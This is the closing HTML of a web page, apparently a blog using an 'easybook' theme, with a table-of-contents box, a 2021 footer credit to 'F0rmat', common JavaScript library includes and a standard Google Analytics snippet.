    <div class="col-box-title">TOC</div>
</div>
            </div>
        </div>
    </div>
    
    <footer class="footer">
        <div class="wrapper">
    © 2021    <a href="https://getshe11.com/">F0rmat</a>
</div>
    </footer>
    
    
<script src="https://cdn.jsdelivr.net/npm/jquery@1.11.0/dist/jquery.min.js"></script>

<script src="/js/easybook.js"></script>

<script src="/js/lazysizes.min.js"></script>

<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/dist/js/lightgallery-all.min.js"></script>
<script src="/js/figure.js"></script>


<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-XXXXXXXX-X', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>






</body>

</html>